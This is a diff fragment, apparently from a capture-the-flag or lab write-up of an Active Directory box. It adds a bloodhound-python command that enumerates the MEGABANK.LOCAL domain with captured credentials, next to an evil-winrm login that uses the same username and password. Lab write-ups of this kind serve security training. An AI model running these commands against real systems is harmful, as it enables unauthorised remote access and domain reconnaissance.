@@ -37,7 +37,7 @@ evil-winrm -i 10.129.228.111 -u mhope -p '4n0therD4y@n0th3r$'
 ```
 
 ```
-
+bloodhound-python -u 'mhope' -p '4n0therD4y@n0th3r$' -d MEGABANK.LOCAL -dc 10.129.228.111 -ns 10.129.228.111 -c All
 ```
 
 ```
